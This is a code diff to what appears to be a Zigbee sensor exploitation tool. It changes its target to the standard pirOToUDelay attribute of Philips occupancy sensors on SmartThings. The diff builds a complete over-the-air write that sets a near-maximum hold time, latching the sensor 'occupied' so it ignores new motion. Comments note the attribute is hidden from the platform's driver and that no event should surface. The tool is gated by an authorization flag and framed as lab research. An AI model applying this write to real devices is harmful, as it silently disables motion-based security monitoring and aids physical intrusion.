@@ -78,7 +78,7 @@ TARGET_CLUSTERS: dict[str, dict[str, Any]] = {
         "attributes": ["batteryPercentageRemaining", "batteryVoltage"],
     },
     "msOccupancySensing": {  # 0x0406 — primary neutralization target lives here
-        "attributes": ["occupancy", "pirOToUDelay",       # 0x0000, 0x0010
+        "attributes": ["occupancy", "pirOToUDelay", "pirUToODelay", "pirUToOThreshold",       # 0x0000, 0x0010
                        {"id": 0x0030, "mfg": PHILIPS_MFG_CODE}],  # Philips sensitivity
     },
     "msIlluminanceMeasurement": {  # 0x0400
@@ -89,13 +89,15 @@ TARGET_CLUSTERS: dict[str, dict[str, Any]] = {
     },
 }
 
-# Primary exploit target: Philips manufacturer-specific "sensitivity" on 0x0406.
+# Primary exploit target: pirOToUDelay (0x0010) on 0x0406 — standard ZCL hold time;
+# hidden from the SmartThings edge driver. Max value latches "occupied" -> sensor blind.
 EXPLOIT_TARGET = {
     "cluster": "msOccupancySensing",   # 0x0406
-    "attribute_id": 0x0030,
-    "manufacturer_code": PHILIPS_MFG_CODE,
-    "neutralize_value": 0,             # lowest sensitivity — confirm effect by walk-test
-    "zcl_type": 0x20,                  # uint8; confirm from DiscoverAttributes output
+    "attribute": "pirOToUDelay",       # 0x0010
+    "attribute_id": 0x0010,
+    "manufacturer_code": None,         # standard attribute; no manufacturer code
+    "neutralize_value": 0xFFFE,        # ~18h hold; sensor stays "occupied", ignores new motion
+    "zcl_type": 0x21,                  # uint16
 }
 
 # ── SmartThings baseline (the "visible" set) ──────────────────────────────────────
@@ -509,25 +511,25 @@ def cmd_diff(args) -> int:
 
 
 def cmd_exploit(args) -> int:
-    """GATED STUB: OTA-write the hidden sensitivity attribute to neutralize the sensor.
+    """GATED: OTA-write the hidden pirOToUDelay attribute (max hold) to neutralize the sensor.
 
     The write payload is fully formed below but is only SENT with --i-have-authorization,
     and only against the author's own isolated lab device. Verify physically by walk-test
     and confirm no event surfaces on the platform.
     """
     tgt = EXPLOIT_TARGET
-    payload = {
-        "write": {
-            "cluster": tgt["cluster"],
-            "options": {"manufacturerCode": tgt["manufacturer_code"]},
-            "payload": {
-                str(tgt["attribute_id"]): {
-                    "value": tgt["neutralize_value"],
-                    "type": tgt["zcl_type"],
-                }
-            },
-        }
+    write_body: dict[str, Any] = {
+        "cluster": tgt["cluster"],
+        "payload": {
+            tgt["attribute"]: {
+                "value": tgt["neutralize_value"],
+                "type": tgt["zcl_type"],
+            }
+        },
     }
+    if tgt.get("manufacturer_code") is not None:
+        write_body["options"] = {"manufacturerCode": tgt["manufacturer_code"]}
+    payload = {"write": write_body}
     log("exploit target (neutralization write):")
     log(json.dumps(payload, indent=2))
     if not args.i_have_authorization:
@@ -605,7 +607,7 @@ def _visible_attr_set(visible: dict) -> set:
 
 def _is_target_hidden(hidden: dict) -> bool:
     for a in hidden.get(EXPLOIT_TARGET["cluster"], []):
-        if a.get("attribute") == EXPLOIT_TARGET["attribute_id"]:
+        if a.get("attribute") == EXPLOIT_TARGET["attribute"]:
             return True
     return False
 
